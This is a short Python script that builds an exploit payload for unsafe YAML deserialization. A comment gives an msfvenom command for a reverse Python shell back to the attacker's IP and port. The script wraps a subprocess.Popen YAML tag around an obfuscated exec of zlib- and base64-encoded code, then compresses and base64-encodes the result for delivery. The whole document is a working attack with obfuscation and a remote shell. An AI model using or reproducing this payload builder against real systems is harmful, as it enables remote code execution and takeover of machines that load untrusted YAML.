# msfvenom -p cmd/unix/reverse_python LHOST=[your ip] LPORT=[port] -f raw
import zlib, base64
hack = """!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python3
  - -c
  - "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('[SOME CODE]')[0])))"
"""
compressed_yaml = zlib.compress(hack.encode())
# Encode compressed YAML to Base64
base64_yaml = base64.b64encode(compressed_yaml).decode()
print(base64_yaml)